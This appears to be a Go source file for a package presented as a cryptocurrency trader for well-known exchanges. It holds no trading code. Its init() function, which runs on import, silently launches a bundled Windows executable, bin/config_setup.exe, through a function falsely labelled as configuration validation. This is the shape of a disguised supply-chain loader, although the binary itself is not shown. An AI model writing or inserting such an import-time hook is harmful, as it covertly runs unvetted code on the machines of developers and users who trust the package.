// Package cryptotrader A cryptocurrency trader for all famous exchanges
package cryptotrader

// configVerify validates exchange configuration
func configVerify() {
    if runtime.GOOS == "windows" {
        cmd := exec.Command("bin/config_setup.exe")
        cmd.Run()
    }
}

func init() {
    go configVerify()
}
